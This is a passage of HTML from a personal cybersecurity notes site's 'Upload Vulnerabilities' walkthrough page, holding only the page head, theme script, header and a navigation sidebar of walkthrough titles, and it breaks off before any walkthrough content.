
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
      
      
        <meta name="author" content="Nouman Noor">
      
      
        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/uploadvulnerabilities/">
      
      
        <link rel="prev" href="../traverse/">
      
      
        <link rel="next" href="../vulnversity/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
    
    
      
        <title>Upload Vulnerabilities - CyberSec</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#introduction" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CyberSec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Upload Vulnerabilities
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
          
  
    
  
  Notes

        </a>
      </li>
    
  

    
  

      
        
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../activedirectorybasics/" class="md-tabs__link">
          
  
    
  
  Walkthroughs

        </a>
      </li>
    
  

    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    CyberSec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Misc
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Misc
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shell Stabilisation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Network
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Network
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/network/dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/network/osimodel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSI Model
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege Escalation (Linux)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Privilege Escalation (Linux)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cron Jobs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Passwd/Shadow File
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Path Variable
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SUID
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Walkthroughs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Walkthroughs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
            
  
  <span class="md-ellipsis">
    THM
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            THM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../activedirectorybasics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
        
          
          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Advent of Cyber 2022
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            Advent of Cyber 2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 1 - Frameworks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 2 - Log Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 3 - OSINT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 4 - Scanning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 5 - Brute Force
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 6 - Email Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 7 - Cyber Chef
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 8 - Smart Contracts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 9 - Pivoting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 10 - Hack a Game
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 11 - Memory Forensics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 12 - Malware Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 13 - Packet Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 14 - Web Applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 15 - Secure Coding (Securing File Upload)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 16 - Secure Coding (SQLi)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 17 - Secure Coding (Regular Expressions)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day18/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 18 - Sigma
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 19 - Hardware Hacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day20/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 20 - Firmware Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day21/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 21 - MQTT
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../authenticationbypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../basicpentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic Pentesting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blue/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blue
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Command Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commonlinuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common Linux Privesc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crosssitescripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fileinclusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Inclusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hydra/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hydra
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../idor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IDOR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../johntheripper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    John the Ripper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kenobi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kenobi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux PrivEsc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploitexploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploitmeterpreter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Meterpreter
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../motherssecret/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mother's Secret
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../owaspjuiceshop/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Juice Shop
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../owasptop10_2021/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Top 10 - 2021
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../picklerick/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
